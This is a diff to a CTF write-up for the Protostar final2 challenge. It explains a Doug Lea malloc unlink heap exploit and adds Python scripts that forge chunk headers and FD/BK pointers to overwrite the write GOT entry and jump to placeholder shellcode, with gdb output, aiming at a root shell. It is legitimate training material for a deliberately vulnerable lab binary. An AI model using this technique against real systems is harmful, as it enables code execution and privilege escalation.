@@ -2,8 +2,7 @@
 
 [Challenge's page](https://exploit-exercises.lains.space/protostar/final2/)
 
-This is your standard Doug lea heap implementaion exploit, that could be a bit of a headacha, especially if you're
-not very familiar with Doug lea's alogrithem, which i will try to explain along the way.
+This is your standard Doug lea heap implementaion exploit, that could be a bit of a headacha but it is what it is.
 
 ##### First lets take a look at the code
 ```C
@@ -410,3 +409,178 @@ chunk2 heap meta data.
 
 ![image2](https://raw.githubusercontent.com/YazoSh/ctf-writeups/master/images/final2-2.png)
 
+now that we have full controll of our chunk's data, all we need is to trigger the unlink macro in the Doug Lea algorithem
+and manipulate the FD and BK pointers.
+
+the first block is freed first so all we have to do is to trigger the 'consolidate forward if'.
+
+```C
+ if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
+  {
+    sz += nextsz;
+
+    if (!islr && next->fd == last_remainder(ar_ptr))
+                                              /* re-insert last_remainder */
+    {
+      islr = 1;
+      link_last_remainder(ar_ptr, p);
+    }
+    else
+      unlink(next, bck, fwd);
+
+    next = chunk_at_offset(p, sz);
+  }
+```  
+which calles the unlink macro on the next block if it's free by checking the next next chunk's prev_inuse bit
+but, we cant create an another block to clear its prev_inuse bit cause we'll just get stuck in a paradox.
+
+se we use a trick mentioned in the [Prack article Once upon a free()](http://phrack.org/issues/57/9.html)
+and sit chunk2's prevsize and size to 0xfffffffc which will trick the 'inuse_bit_at_offset' macro by overflowing the 'next' pointer to point to the same chunk
+which we set to have a cleared inuse_bit and triggering our 'if'
+
+```python
+import socket
+import struct
+
+s = socket.socket(socket.AF_INET)
+s.connect(('127.1', 2993))
+
+# first chunk
+ck1 = "FSRD/0000ROOT/1111"
+ck1 += "/" * (128 - (len(ck1)))
+s.send(ck1)
+
+# second chunk
+ck2 = "FSRDROOT/"
+ck2 += struct.pack('I', 0xfffffffc)
+ck2 += struct.pack('I', 0xfffffffc)
+
+ck2 += "A" * (128 - (len(ck2)))
+s.send(ck2)
+```
+*here i am using the struct modual to pack my number to little endian*
+
+now we can overwrite some library function's GOT addr to redirect execution to shellcode
+
+we cant overwrite the free GOT address because the binary was staticly linked with the malloc functions
+but we have the write function which we can get its get is GOT address's address and overwrite it with pointer to our shellcode.
+
+get the write function's addr
+
+```
+(gdb) info functions write
+...
+0x08048dfc  write
+0x08048dfc  write@plt
+0x08048f2c  fwrite
+0x08048f2c  fwrite@plt
+(gdb) disassemble 0x08048dfc
+Dump of assembler code for function write@plt:
+0x08048dfc <write@plt+0>:       jmp    DWORD PTR ds:0x804d41c
+0x08048e02 <write@plt+6>:       push   0x68
+0x08048e07 <write@plt+11>:      jmp    0x8048d1c
+End of assembler dump.
+(gdb)
+```
+0x804d41c is our pointer we want to write over
+with our shellcode pointer which we can place in our second chunk
+
+if take a look at the unlink macro code
+```C
+#define unlink(P, BK, FD)                                                \
+{                                                                        \
+  BK = P->bk;                                                            \
+  FD = P->fd;                                                            \
+  FD->bk = BK;                                                           \
+  BK->fd = FD;                                                           \
+}
+```
+
+which is equivalent to
+
+```
+*(next->fd + 12) = next->bk
+*(next->bk + 8) = next->fd
+```
+
+the first line writes BK to *(FD + 12)
+
+so all we have to do is subtract 12 from write's pointer
+
+```python
+import socket
+import struct
+
+s = socket.socket(socket.AF_INET)
+s.connect(('127.1', 2993))
+
+# first chunk
+ck1 = "FSRD/0000ROOT/1111"
+ck1 += "/" * (128 - (len(ck1)))
+s.send(ck1)
+
+# second chunk
+ck2 = "FSRDROOT/"
+ck2 += struct.pack('I', 0xfffffffc)
+ck2 += struct.pack('I', 0xfffffffc)
+#FD and BK
+ck2 += struct.pack('I', 0x0804d41c - 12)
+ck2 += struct.pack('I', 0x0804e098)
+#shellcode
+ck2 += '\xcc' * 20
+
+ck2 += "A" * (128 - (len(ck2)))
+s.send(ck2)
+```
+FD is write's pointer
+BK is a pointer to our shellcode
+and as shellcode '\xcc' will do fine for testing since it will rise a SIGTRAP signal and till us if our redirection was successful
+
+run gdb and execute and run the script
+
+```
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x0804e099 in ?? ()
+(gdb)
+```
+we recive SIGTRAP at 0x0804e099.
+
+if we examine the heap
+
+![image3](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-3.png)
+
+Nice! all we have to do now is to place our shellcode and bam
+
+but, our shellcode will get destoyed at addresses 0x0804e0a0-0x0804e0a3 because of the second write unlink does
+but we can fix this easily with a simple "\xeb\x0c" with some NOPS to jump 12 bytes, over the destoyes bytes to our shellcode
+
+```python
+import socket
+import struct
+
+s = socket.socket(socket.AF_INET)
+s.connect(('127.1', 2993))
+
+# first chunk
+ck1 = "FSRD/0000ROOT/1111"
+ck1 += "/" * (128 - (len(ck1)))
+s.send(ck1)
+
+# second chunk
+ck2 = "FSRDROOT/"
+ck2 += struct.pack('I', 0xfffffffc)
+ck2 += struct.pack('I', 0xfffffffc)
+#FD and BK
+ck2 += struct.pack('I', 0x0804d41c - 12)
+ck2 += struct.pack('I', 0x0804e098)
+#shellcode
+ck2 += "\xeb\x0a"
+ck2 += '\x90' * 20
+ck2 += '\xcc'
+
+ck2 += "A" * (128 - (len(ck2)))
+s.send(ck2)
+```
+![image4](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-4.png)
+
+all we have to do now is to throw in some shellcode to execute /bin/sh and give us a root shell! 
